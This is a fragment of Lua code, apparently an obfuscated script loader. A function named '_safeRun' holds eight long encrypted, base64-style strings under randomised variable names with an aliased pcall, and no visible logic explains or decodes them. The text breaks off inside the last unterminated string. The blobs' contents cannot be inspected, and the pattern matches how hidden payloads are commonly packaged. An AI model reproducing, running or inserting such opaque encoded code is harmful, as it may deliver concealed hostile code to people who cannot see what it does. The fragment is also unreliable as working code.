local _ttd = pcall
local _zpy = nil
local _odo = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "EgLpEEzFLPJ+1AbZUb8OmjP+aHrjhRba9xjp6FGHFNrqZHnAqACdlBK3FO+iVmKq3ZWQ6Ff5XxZpwLYkbupErXJOmx8zrhhEKOK5kdmnTIrpayHgvjHfhVzVCEbOygyx59KUAtad0rdAPUKUz/mI39dDnSEOQGcPCGwHUdyVCpwX0GQzcM3/o9k8CZvZwTmJ5dkXKzjXoCTKAk/0Or8yiF8S9hSEmAXveoYQvnTrdqjJLmJtbSQrRiHIMc8TSHXPPDO9v7cMSNh7FVNU+9P8M6QkF/+4M8P1g+0Oe8nAq5FrmNra5aRtMAvRep4/YvsjMCoxHj/zOR4ibWUH+33F9iLSXiZJOdIM9QEv/a78w/WQxgiSRK4GoLc86FttpFXuQdvGrRETZfRai/BkXo30BIWWa26u2S+ttKxOUnSi0+gtdRWrBFOHQJn6njfX96w5xOR/XLuVqBvKmJxhnc3YhCXTRJNmvkTCcGLM7hSv4EeRr+8YmyTfdvn2/I5WSH7W9S+s0ZF7YEQkFFK6BfSNx6vS8c6KK9ZsbrOfNYqDF4qpcntM8Xlrtukh2Z0tuabyj5KMJslZu8iH4t/iANkhJu5vNFp+5uzCvYmY8qyEtzasjpLJnCGVEVuI63+H3Xg2UB5LMmSTy4QaAo3MtlTHH9NhQGASl+dZwxpg2rtJ99Z277DlIkstsUux5fSg1Td3pjfi8SDG3lxaCSHRlkmwQd+lP2DlSbPBj0xY/NGOCkj6zOA5oQ1Lwdtw46R3cwMXA9NPlNcFK69XZXcPmpx3YVez56dbfC3vaNlXdnsr+w/qZchf94Ep800vXcmWA3gb9MaBY8NvhYEdfksTEJdh/marBbkVe6F1WmCYa7zjj6leQtc7CYxGNj5oncqGDmCAob3EDBX00nY2j8BlkjFvI1U82LJ0R1jKqPW2TbWOW9uhxkEwywmEd640HjSM9Qt36Rr94QCv372NOlEOpJT2u+k7nd74Do3Gf3WZWq6o7+yWSNF5z/n4WnG/0tP8AiijaBJm4pZtxQ6u4EQ3rAEFewZwvW/WN+6UzgE2qcenm3hw4aPUdXZXPz9fXEnbmNCEtn/5pazmH7ui/yXOWtuEU8Q698P4835PTqDL9f43PcLgo620jfwv10Uc132ms1McsDd7y28QSbvvSRrvFDP2dWcKa+djZDOFYU1I1Hp5ynOla2k6jCzRWoMRixPApb/rZhyLMTWMmP+h1SeKAISPM37WwT/5bfyyhmDXomDQjWGG0BrR3xbDeW/WlcThdfslakeuWvdBi3Su7vPtSNkt/XBe+6mQsq7btuaLLzrvaDY6xF9/f/m3HtACdnYgC+SWHQJTb3mMpCAfqTcjemrEO32AY7qJo8dKIfmg6xrm8ieHS27P0wiYCX5Cl6IFQXekSFSjk7PLJ6nw2I7FIR03blHXWQ42r/qF2wcEOVFpGQ34BB8n/Nc40I/0xgo7HxLX7N3yRn5btZY4fEOcFIOE1q9qjUevT2RleAm/Jv5eo+UZZg0cozeY5vCFTtpltxXqeBgEMFdrXO/p5kMR3pk4Bd3TM3JpADylHXENT57ehvmcUs3EZ+xbFN7QIXzfI++HprtVtJ1M6Y9niIRlPuUJC/utoVzRfU4C6QzMFDR3Dp84ocAx0B6Tc4r9/PpjIVkgmEc7SpmQRAxGts7GVRZDoK7qkNardGPpInTmgbM/Sp96jo+dms41e9ZW/L7LGL75kCXLfAsG8HI7BOqrEadQX5wrgmzHYKgAO2XjMrnSb5zFPH+qKbHmr9bjyJjJIjOfBJJQgJk1+QPGAC31mGeDAomYxv9hSDNWmxJdCly6qnNndJH75Vo6s30VblaVDrsO0hagwpGaPVRSyFxrYPW4F1D7XQmS29CWqSA+6MX5bdNTMCg6eA0CgV4qKCux9wtNB+CyQOFglF0/Rc7HQQlreZX9EMKDq7ZdjqP//hfJDgNQ/0BEdv3k1xWoEFmMOEwpUSbZO1tLx66CBBph"
  local _b3 = "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"
  local _b4 = "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"
  local _b5 = "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"
  local _b6 = "xlpeGYUsbIRSe+Q3c3TFZ23+Oef0tBt3tFvMFA9vUoskCXXELTGKJGlzOyzi6I7mDKlaxiYLZx5IjupDpPDTJWPkTRCAeVaLu/aJWN5g2yfJ1/m4LxHdfRyjrNTQ6Pg8j70CE4a8/9kwP5ygS8FYItkks4n1awEEoc5dGjvlyDBLO0qPTeaSte3KSr6+L3y8gq+946qggKTeGrHrXiZTECkA1SJlVIkv8/M1tRAWQSgeHpEQVRlf4MMnb7mh0z4Bfht38dB+4Esu4YmZBwlFMmJB2JPlS0EG+n987UfOGgS/26Gof/ZZR9e3cPLbLbx7fqOcs4PSCbVtavgvEqriJIyTlqZ+HH4rBe6w5E2AH5ERZqRo0drpE2n55HqW3D3MGo/VhrecqlXwsvdLWKOvr19ISFyUDXPiJZBt6b2DAnnXxUdF1rU2TZqDeUOQB+JcCpJGdDtdwTdMu/O2YZPQjF9NHLWfdHppUI5p6tvbQymKz4b5zdin4SUXP39l6llqdX4hLSPFezfqH/2XPxOfkk9bTQykOrCVWebRS6mQlIFYsOOW8PI6FsmKTlkH1+nAqDOZQ2chVZKnv3mclNgIblxRXvf27z0NkqkeHUY0NhKIgysVfFktJqrzQ2FCEFL7UJ6QSD/bUtPGf3Ux8WJUvnHRFya8eoteqvC2slfnldpm0sor0SOPe7vh9btmh1OPHr/fOuOoUqe3c46TsuWQEnX453N9yMmxLpopyoaeBfRBc/GG65UNgAApBgOfwPYu5qYyHJiKd+x5VHFNZPCUCB5znVee/ev7eeWM51X0QuRqAVzNCU/yoFD58c6SJaqALK6+NuKX7jjsOoMP+ywV5eAmTI3diH/FqwvLcxwCR0fAImDsoNAwVDEhfcWFRtMP1fQ1yYyJl6fCJeMHoMTv159VIpvHZS7K1YPgzxhxiTCDRJnEhFLsb4iUJGYTC/He1MiHffCwUvBDsQPNn4nvS6wOGnDbdjNRgz6gDpkRt2Df/pv3f+6PZbrNl+8BbM+xkz78r2ZH1hbkn/TvYLGXQdXN0XYAFWcExbrju5EXx3PUCkR8agTkVNJZ/iPk+A1Ab2Fg7v4cz5C1BM3yWoMVEypvQlQokaJqW8VXTsVycyM1UMWGPv69HF04qy3BBC+sBvcxKXHhU7aBZXmY7vPyse+ga4TqKTwH6d6NiZC70wBEdMO8Jpyd+FeO69jNh9mrdG0lTzW3JoRV1f+tvyOKkRo36NsyOZrpVb6KOB2lrg661inbR4K+3W3tqzvgRU4+KEhPt/XmFYCNtfNoVu/LXbxBNv/tbDuXYGLXxTOmQomRydq3f/geqRxcIw4HqjqLhY0klRTkxYrEPFUn9/ogWhWGrb6S9y96WgI3P9jgSlZvxYq0q+Uq8hgASStP98IEi1jl7+n/+pRzvu+0nt2hAtCCIgcZ6MHBWCQ21Ses4wKYAavjNXpsTtEdBfYuLFTNrlswkbsLdAwCHHekps6Rzu/oyEaluAaSnSYoGShirxGc8DrtA6W/eVxGazE+AG0bKA07YGh7UGg8QYkZ1jvgDBxlGPYnMK36AUtNG7JwKsVZFftjp5oF0eFx95Rl2Q8kzvCQY8LHkndm41dGGI3jf2+AuumibKKyCSQFY+9XGy8kSj3zSa0ZMowbM9h7hq8ARqPA+5eefbbKK+q7ErWzWvy9VOAB2r5CIha+ohXZtIbMpwxkAmKWCOXYYvpY9L2T0rW8jCwYp27Llbxc7+rWcvWf22+AYbx/q6osdjzBqapgVk1lUwdjVJRgBrcE2QaUxkb5TETYVoKbVBY15O/hlyig6UrMEJyLgoajndMgpFxBCYR2oIyuyeh+AHF6vgW9eMpudDmwvv/NCYSDBEM7B8es0Eh/n6CIi6w69/o4A2j0I4fIL8BQtTFfAU+7w/UKOlunaqUkkJDtS0cZT8tKv8s/gLpvCltS+wwxVk/LCMnr2YjcrwXJsyQJkMjMdeJtg13ka2qef5B7BloW"
  local _b7 = "8XOW1e0cHdVkt9bJrzWfeZorvfNxgPhZUwPellnnhu16tDxNy7yFS5k/IPVc5f9rbQkXGxKAWnwQCtQ5apHsMfcTpkDANLkMESuc0RaGO5tEUcENxzmjP3flfCKn97fbXgjkMRhsOu5Ml4HfdY41WEuzTEu0VeJsb82GdryoWXDddEvotF7JmTIDSMcXwO3OuRTDh5TltVIrEAQ/mkZNoBNUpViahwu+m92eQelZFhuSZ7+GZ0PploMfdDoTe9I/Y0XIkWrv3aomY9D7+zOtpPhXoU2X7zFTOCeWFzJ9hh8iOaU6qvrB1LePkDO24dxWQdsJj+OsO9lBGaqFdiEUUqlZSRpI9n587LvaVGXu6/h4N/0u47dMGfW9EXOWwzcbsppS7Z1Nma/83G0z5xn8zIwFv62U2VqQcdrCohMjbEdB3/MSMq9PxJL0eK6IYLvDZd6XnS4nykXxDn/cyMTtm48DirVhXv7Qtfpr9M8KwxKCoHdguUqkKe+WGCB34tYxf8i0qKBvdXssUmqoXyAW1ds4IFpmAP3lMnk7g7GiGzIPBMLVR6P4QjCQhXZtTXRi5DIsGGuiVT7D+j2+CUqK46gGODM0cJv240EDiacWqeeOXOuqJDjSPGhXS9N+4XBWVwG+kUP59Wk0HglOd2jr/uSWLAACGDxGuvnBLlBO6EXJvhxuidD/m4lwDCLmNSSxrgAe02FQgMsW18wjYCMyqisAxD3h3X9PA7vP0IaYeFqCUNIBIh30c2CFQWUm7y7Qnl6jNmrBM1Gp1P5RWJwo9OIe8Z5GKVQuOsHCJM54dmeBUaEHZfRZQ7/DYtuz5b51k3ehS1YiZqqbaZGrO1yFhY1ZuFaMbYxhDA+42E/Gnz1DuiERQxZJQ1gjVDCpphHG04Bguw0Lb4falEXctaAAxSTJ4qKdrWDWPyqhZF0n3RvJjvYJWhBcA5Tup8xNJbE9Yn6NayIJU+3yJjkXkVfgEQ57N74jDdVbieLgevjEPPOWxurMWNd1FHVIgVypVPdPXgOeGal/XaxM9rdx7x3st36gn7EpCj8FlJIaTh5njiTGtb4KrNFkFPRvrn3nbKwi5I/9w8/BeEzqvDq1+X6PSHQ1sAmbAoAk6fpKjKN50+3q4+/vKbM8fgthYEjc/zVEADyg6lWY9V94oypD9yGjY/JhZGknDyb9CogALQVqfnMabRsVZUPbYDy1M0qwmZOb1pG7x9pQE0qaycPrICw6GXu22kidHFXvrlZ6DIQ0kAN5FossvckR1zK+xcENAFC6SN5uNVTFkdPoz46Qv3G5ffoF5BUSFjnVnlXvNRUFEEmgmAMqPLVlUXkyjcxCr1QXQlYUTz0dK05QfbswU3bQSkCy18PDALLBisSFx/yfhl6sNZGrhDwA8UCUg+MkTtlPXstvr9HnbP4sp7XfiCFWQsg8j+Gig9SK42bSppqDLpc97S1d/1lBLX2CNQGNsxCOg362b7+K87lSr+6MC5/WTJXHB5pQ0VTOWY9c8m/5z1INMhT/PQKAF48rvwP7VefowhiuvL1jsr5QHKLKpEhb6Kp3Augr1ZklZw00QxlRPlke2rOsjH0AalB+Bx5kBiz4zd4F6kTIn+EcNeqn4+6HpIOsuc/bp2yvPFB/+